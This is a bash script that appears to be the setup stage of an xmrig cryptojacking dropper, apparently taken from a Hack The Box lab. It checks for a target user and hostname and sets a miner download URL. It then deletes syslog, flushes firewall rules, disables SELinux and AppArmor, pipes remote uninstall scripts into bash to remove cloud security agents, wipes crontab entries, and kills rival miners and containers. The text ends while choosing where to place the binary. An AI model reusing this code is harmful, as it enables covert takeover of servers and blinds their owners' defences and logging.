#!/bin/bash

checkTarget() {
  EXPECTED_USERNAME="root7654"
  EXPECTED_HOSTNAME_PREFIX="UNZ-"

  CURRENT_USERNAME=$(whoami)
  CURRENT_HOSTNAME=$(hostname)

  if [[ "$CURRENT_USERNAME" != "$EXPECTED_USERNAME" ]]; then
      exit 1
  fi

  if [[ ! "$CURRENT_HOSTNAME" == "$EXPECTED_HOSTNAME_PREFIX"* ]]; then
      exit 1
  fi
}

BIN_MD5="96cc922d3eb9ef23859377119332f8d7"
BIN_DOWNLOAD_URL="http://tossacoin.htb/xmrig"
BIN_DOWNLOAD_URL2="http://tossacoin.htb/xmrig"
BIN_NAME="xmrig"

cleanEnv() {
  ulimit -n 65535
  rm -rf /var/log/syslog
  chattr -iua /tmp/
  chattr -iua /var/tmp/
  chattr -R -i /var/spool/cron
  chattr -i /etc/crontab
  ufw disable
  iptables -F
  echo "nope" >/tmp/log_rot
  sudo sysctl kernel.nmi_watchdog=0
  echo '0' >/proc/sys/kernel/nmi_watchdog
  echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
  userdel akay
  userdel vfinder
  chattr -iae /root/.ssh/
  chattr -iae /root/.ssh/authorized_keys
  rm -rf /tmp/addres*
  rm -rf /tmp/walle*
  rm -rf /tmp/keys
  ps aux| grep "/dot"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  pkill -f hezb
  ps aux| grep "tracepath"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  pkill -f /tmp/.out
  ps aux| grep "./ll1"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  if ps aux | grep -i '[a]liyun'; then
    curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
    curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
    pkill aliyun-service
    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    systemctl stop aliyun.service
    systemctl disable aliyun.service
    service bcm-agent stop
    yum remove bcm-agent -y
    apt-get remove bcm-agent -y
  elif ps aux | grep -i '[y]unjing'; then
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
  fi
  pkill -f .git/kthreaddw
  ps aux | grep "agetty" | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
  crontab -l | sed '/base64/d' | crontab -
  crontab -l | sed '/python/d' | crontab -
  crontab -l | sed '/shm/d' | crontab -
  crontab -l | sed '/postgresql/d' | crontab -
  crontab -l | sed '/cloudfronts/d' | crontab -
  crontab -l | sed '/sshd/d' | crontab -
  crontab -l | sed '/linux/d' | crontab -
  crontab -l | sed '/neoogilvy/d' | crontab -
  crontab -l | sed '/rsync/d' | crontab -
  crontab -l | sed '/bpdeliver/d' | crontab -
  pkill -f sshd
  pkill -f htop
  pkill -f linuxsys
  pkill -f kthreaddo
  pkill -f donkey
  netstat -anp | grep ":1414" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep "127.0.0.1:52018" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :4444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep :13531 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  cat /tmp/.X11-unix/01|xargs -I % kill -9 %
  cat /tmp/.X11-unix/11|xargs -I % kill -9 %
  cat /tmp/.X11-unix/22|xargs -I % kill -9 %
  cat /tmp/.systemd.1|xargs -I % kill -9 %
  cat /tmp/.systemd.2|xargs -I % kill -9 %
  cat /tmp/.systemd.3|xargs -I % kill -9 %
  kill -9 $(cat /tmp/.systemd.1)
  kill -9 $(cat /tmp/.systemd.2)
  kill -9 $(cat /tmp/.systemd.3)
  cat /tmp/.pg_stat.0|xargs -I % kill -9 %
  cat /tmp/.pg_stat.1|xargs -I % kill -9 %
  cat $HOME/data/./oka.pid|xargs -I % kill -9 %
  pkill -f p8444
  pkill -f supportxmr
  pkill -f monero
  pkill -f zsvc
  pkill -f pdefenderd
  pkill -f updatecheckerd
  pkill -f cruner
  pkill -f dbused
  pkill -f bashirc
  pkill -f meminitsrv
  pkill -f kthreaddi
  pkill -f srv00
  pkill -f /tmp/.javae/javae
  pkill -f .javae
  pkill -f .syna
  pkill -f .main
  pkill -f xmm
  pkill -f solr.sh
  pkill -f /tmp/.solr/solrd
  pkill -f /tmp/javac
  pkill -f /tmp/.go.sh
  pkill -f /tmp/.x/agetty
  pkill -f /tmp/.x/kworker
  pkill -f c3pool
  pkill -f /tmp/.X11-unix/gitag-ssh
  pkill -f /tmp/1
  pkill -f /tmp/okk.sh
  pkill -f /tmp/gitaly
  pkill -f /tmp/.x/kworker
  pkill -f /tmp/.X11-unix/supervise
  pkill -f /tmp/.ssh/redis.sh
  ps aux| grep "./udp"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "./oka"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "postgres: autovacum"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps ax -o command,pid -www| awk 'length($1) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey|grep -v xmrig| awk '{print $2}'|xargs -I % kill -9 %
  ps ax -o command,pid -www| awk 'length($1) == 16'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $2}'|xargs -I % kill -9 %
  ps ax| awk 'length($5) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $1}'|xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/sscks' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "sleep 60"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "./crun"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -vw kdevtmpfsi | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi|grep -v postgresq1 | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
  systemctl stop c3pool_miner.service
  pkill -f pastebin
  pkill -f ssh-agent
  pgrep -f monerohash | xargs -I % kill -9 %
  pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
  pgrep -f xzpauectgr | xargs -I % kill -9 %
  pgrep -f slxfbkmxtd | xargs -I % kill -9 %
  pgrep -f mixtape | xargs -I % kill -9 %
  pgrep -f addnj | xargs -I % kill -9 %
  pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
  pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
  pgrep -f mqdsflm.cf | xargs -I % kill -9 %
  pgrep -f stratum | xargs -I % kill -9 %
  pgrep -f lower.sh | xargs -I % kill -9 %
  pgrep -f ./ppp | xargs -I % kill -9 %
  pgrep -f cryptonight | xargs -I % kill -9 %
  pgrep -f ./seervceaess | xargs -I % kill -9 %
  pgrep -f ./servceaess | xargs -I % kill -9 %
  pgrep -f ./servceas | xargs -I % kill -9 %
  pgrep -f ./servcesa | xargs -I % kill -9 %
  pgrep -f ./vsp | xargs -I % kill -9 %
  pgrep -f ./jvs | xargs -I % kill -9 %
  pgrep -f ./pvv | xargs -I % kill -9 %
  pgrep -f ./vpp | xargs -I % kill -9 %
  pgrep -f ./pces | xargs -I % kill -9 %
  pgrep -f ./rspce | xargs -I % kill -9 %
  pgrep -f ./haveged | xargs -I % kill -9 %
  pgrep -f ./jiba | xargs -I % kill -9 %
  pgrep -f ./watchbog | xargs -I % kill -9 %
  pgrep -f ./A7mA5gb | xargs -I % kill -9 %
  pgrep -f kacpi_svc | xargs -I % kill -9 %
  pgrep -f kswap_svc | xargs -I % kill -9 %
  pgrep -f kauditd_svc | xargs -I % kill -9 %
  pgrep -f kpsmoused_svc | xargs -I % kill -9 %
  pgrep -f kseriod_svc | xargs -I % kill -9 %
  pgrep -f kthreadd_svc | xargs -I % kill -9 %
  pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
  pgrep -f kintegrityd_svc | xargs -I % kill -9 %
  pgrep -f jawa | xargs -I % kill -9 %
  pgrep -f oracle.jpg | xargs -I % kill -9 %
  pgrep -f servim | xargs -I % kill -9 %
  pgrep -f kblockd_svc | xargs -I % kill -9 %
  pgrep -f native_svc | xargs -I % kill -9 %
  pgrep -f ynn | xargs -I % kill -9 %
  pgrep -f 65ccEJ7 | xargs -I % kill -9 %
  pgrep -f jmxx | xargs -I % kill -9 %
  pgrep -f 2Ne80nA | xargs -I % kill -9 %
  pgrep -f sysstats | xargs -I % kill -9 %
  pgrep -f systemxlv | xargs -I % kill -9 %
  pgrep -f watchbog | xargs -I % kill -9 %
  pgrep -f OIcJi1m | xargs -I % kill -9 %
  pkill -f biosetjenkins
  pkill -f Loopback
  pkill -f apaceha
  pkill -f cryptonight
  pkill -f stratum
  pkill -f mixnerdx
  pkill -f performedl
  pkill -f JnKihGjn
  pkill -f irqba2anc1
  pkill -f irqba5xnc1
  pkill -f irqbnc1
  pkill -f ir29xc1
  pkill -f conns
  pkill -f irqbalance
  pkill -f crypto-pool
  pkill -f XJnRj
  pkill -f mgwsl
  pkill -f pythno
  pkill -f jweri
  pkill -f lx26
  pkill -f NXLAi
  pkill -f BI5zj
  pkill -f askdljlqw
  pkill -f minerd
  pkill -f minergate
  pkill -f Guard.sh
  pkill -f ysaydh
  pkill -f bonns
  pkill -f donns
  pkill -f kxjd
  pkill -f Duck.sh
  pkill -f bonn.sh
  pkill -f conn.sh
  pkill -f kworker34
  pkill -f kw.sh
  pkill -f pro.sh
  pkill -f polkitd
  pkill -f acpid
  pkill -f icb5o
  pkill -f nopxi
  pkill -f irqbalanc1
  pkill -f minerd
  pkill -f i586
  pkill -f gddr
  pkill -f mstxmr
  pkill -f ddg.2011
  pkill -f wnTKYg
  pkill -f deamon
  pkill -f disk_genius
  pkill -f sourplum
  pkill -f polkitd
  pkill -f nanoWatch
  pkill -f zigw
  pkill -f devtool
  pkill -f devtools
  pkill -f systemctI
  pkill -f watchbog
  pkill -f cryptonight
  pkill -f sustes
  pkill -f xmrig
  pkill -f xmrig-cpu
  pkill -f 121.42.151.137
  pkill -f sysguard
  pkill -f networkservice
  pkill -f sysupdate
  pkill -f phpguard
  pkill -f phpupdate
  pkill -f networkmanager
  pkill -f /tmp/init12.cfg
  pkill -f kieuanilam.me
  pkill -f init12.cfg
  pkill -f nginxk
  pkill -f tmp/wc.conf
  pkill -f xmrig-notls
  pkill -f xmr-stak
  pkill -f suppoie
  pkill -f zer0day.ru
  pkill -f dbus-daemon--system
  pkill -f nullcrew
  pkill -f systemctI
  pkill -f kworkerds
  pkill -f init10.cfg
  pkill -f /wl.conf
  pkill -f crond64
  pkill -f sustse
  pkill -f vmlinuz
  pkill -f exin
  pkill -f apachiii
  rm -rf /usr/bin/config.json
  rm -rf /usr/bin/exin
  killall log_rot
  pkill -f log_rot
  rm -rf /tmp/wc.conf
  rm -rf /tmp/log_rot
  rm -rf /tmp/apachiii
  rm -rf /tmp/sustse
  rm -rf /tmp/php
  rm -rf /tmp/p2.conf
  rm -rf /tmp/pprt
  rm -rf /tmp/ppol
  rm -rf /tmp/javax/config.sh
  rm -rf /tmp/javax/sshd2
  rm -rf /tmp/.profile
  rm -rf /tmp/1.so
  rm -rf /tmp/kworkerds
  rm -rf /tmp/kworkerds3
  rm -rf /tmp/kworkerdssx
  rm -rf /tmp/xd.json
  rm -rf /tmp/syslogd
  rm -rf /tmp/syslogdb
  rm -rf /tmp/65ccEJ7
  rm -rf /tmp/jmxx
  rm -rf /tmp/2Ne80nA
  rm -rf /tmp/dl
  rm -rf /tmp/ddg
  rm -rf /tmp/systemxlv
  rm -rf /tmp/systemctI
  rm -rf /tmp/.abc
  rm -rf /tmp/osw.hb
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/.java
  rm -rf /tmp/.omed
  rm -rf /tmp/.tmpc
  rm -rf /tmp/.tmpleve
  rm -rf /tmp/.tmpnewzz
  rm -rf /tmp/gates.lod
  rm -rf /tmp/conf.n
  rm -rf /tmp/update.sh
  rm -rf /tmp/devtool
  rm -rf /tmp/devtools
  rm -rf /tmp/fs
  rm -rf /tmp/.rod
  rm -rf /tmp/.rod.tgz
  rm -rf /tmp/.rod.tgz.1
  rm -rf /tmp/.rod.tgz.2
  rm -rf /tmp/.mer
  rm -rf /tmp/.mer.tgz
  rm -rf /tmp/.mer.tgz.1
  rm -rf /tmp/.hod
  rm -rf /tmp/.hod.tgz
  rm -rf /tmp/.hod.tgz.1
  rm -rf /tmp/84Onmce
  rm -rf /tmp/C4iLM4L
  rm -rf /tmp/lilpip
  rm -rf /tmp/3lmigMo
  rm -rf /tmp/am8jmBP
  rm -rf /tmp/tmp.txt
  rm -rf /tmp/baby
  rm -rf /tmp/.lib
  rm -rf /tmp/systemd
  rm -rf /tmp/lib.tar.gz
  rm -rf /tmp/baby
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.mynews1234
  rm -rf /tmp/a3e12d
  rm -rf /tmp/.pt
  rm -rf /tmp/.pt.tgz
  rm -rf /tmp/.pt.tgz.1
  rm -rf /tmp/go
  rm -rf /tmp/java
  rm -rf /tmp/j2.conf
  rm -rf /tmp/.tmpnewasss
  rm -rf /tmp/java
  rm -rf /tmp/go.sh
  rm -rf /tmp/go2.sh
  rm -rf /tmp/khugepageds
  rm -rf /tmp/.censusqqqqqqqqq
  rm -rf /tmp/.kerberods
  rm -rf /tmp/kerberods
  rm -rf /tmp/seasame
  rm -rf /tmp/touch
  rm -rf /tmp/.p
  rm -rf /tmp/runtime2.sh
  rm -rf /tmp/runtime.sh
  rm -rf /dev/shm/z3.sh
  rm -rf /dev/shm/z2.sh
  rm -rf /dev/shm/.scr
  rm -rf /dev/shm/.kerberods
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  chattr -i /etc/ld.so.preload
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  rm -rf /tmp/watchdogs
  rm -rf /etc/cron.d/tomcat
  rm -rf /etc/rc.d/init.d/watchdogs
  rm -rf /usr/sbin/watchdogs
  rm -f /tmp/kthrotlds
  rm -f /etc/rc.d/init.d/kthrotlds
  rm -rf /tmp/.sysbabyuuuuu12
  rm -rf /tmp/logo9.jpg
  rm -rf /tmp/miner.sh
  rm -rf /tmp/nullcrew
  rm -rf /tmp/proc
  rm -rf /tmp/2.sh
  rm /opt/atlassian/confluence/bin/1.sh
  rm /opt/atlassian/confluence/bin/1.sh.1
  rm /opt/atlassian/confluence/bin/1.sh.2
  rm /opt/atlassian/confluence/bin/1.sh.3
  rm /opt/atlassian/confluence/bin/3.sh
  rm /opt/atlassian/confluence/bin/3.sh.1
  rm /opt/atlassian/confluence/bin/3.sh.2
  rm /opt/atlassian/confluence/bin/3.sh.3
  rm -rf /var/tmp/f41
  rm -rf /var/tmp/2.sh
  rm -rf /var/tmp/config.json
  rm -rf /var/tmp/xmrig
  rm -rf /var/tmp/1.so
  rm -rf /var/tmp/kworkerds3
  rm -rf /var/tmp/kworkerdssx
  rm -rf /var/tmp/kworkerds
  rm -rf /var/tmp/wc.conf
  rm -rf /var/tmp/nadezhda.
  rm -rf /var/tmp/nadezhda.arm
  rm -rf /var/tmp/nadezhda.arm.1
  rm -rf /var/tmp/nadezhda.arm.2
  rm -rf /var/tmp/nadezhda.x86_64
  rm -rf /var/tmp/nadezhda.x86_64.1
  rm -rf /var/tmp/nadezhda.x86_64.2
  rm -rf /var/tmp/sustse3
  rm -rf /var/tmp/sustse
  rm -rf /var/tmp/moneroocean/
  rm -rf /var/tmp/devtool
  rm -rf /var/tmp/devtools
  rm -rf /var/tmp/play.sh
  rm -rf /var/tmp/systemctI
  rm -rf /var/tmp/update.sh
  rm -rf /var/tmp/.java
  rm -rf /var/tmp/1.sh
  rm -rf /var/tmp/conf.n
  rm -r /var/tmp/lib
  rm -r /var/tmp/.lib
  rm -rf /tmp/config.json
  chattr -iau /tmp/lok
  chmod +700 /tmp/lok
  rm -rf /tmp/lok
  #yum install -y docker.io || apt-get install docker.io;
  docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
  docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
  setenforce 0
  echo SELINUX=disabled >/etc/selinux/config
  service apparmor stop
  systemctl disable apparmor
  service aliyun.service stop
  systemctl disable aliyun.service
  ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
  rm -rf /usr/local/aegis


  ROOTUID="0"
  BIN_PATH="/etc"
  if [ "$(id -u)" -ne "$ROOTUID" ] ; then
    BIN_PATH="/tmp"
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH not exists or not writeable"
      mkdir /tmp
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH replacing with /var/tmp"
      BIN_PATH="/var/tmp"
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      TMP_DIR=$(mktemp -d)
      echo "$BIN_PATH replacing with $TMP_DIR"
      BIN_PATH="$TMP_DIR"
    fi
    if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
      echo "$BIN_PATH replacing with /dev/shm"
      BIN_PATH="/dev/shm"
    fi
    if [ -d "$BIN_PATH/$BIN_NAME" ]; then
      echo "$BIN_PATH/$BIN_NAME is directory"
      rm -rf $BIN_PATH/$BIN_NAME
    fi
    if [ -e "$BIN_PATH/$BIN_NAME" ]; then
      echo "$BIN_PATH/$BIN_NAME exists"
      if [ ! -w "$BIN_PATH/$BIN_NAME" ]; then
        echo "$BIN_PATH/$BIN_NAME not writeable"
        ls -la $BIN_PATH | grep -e "/dev" | grep -v grep
        if [ $? -eq 0 ]; then
          rm -rf $BIN_PATH/$BIN_NAME
          rm -rf $BIN_PATH/kdevtmpfsi
          echo "found /dev"
        else
          echo "not found /dev"
        fi
        TMP_BIN_NAME=$(head -3 /dev/urandom | tr -cd '[:alnum:]' | cut -c -8)
        BIN_NAME="xmrig_$TMP_BIN_NAME"
      else
        echo "writeable $BIN_PATH/$BIN_NAME"
      fi
    fi
  fi

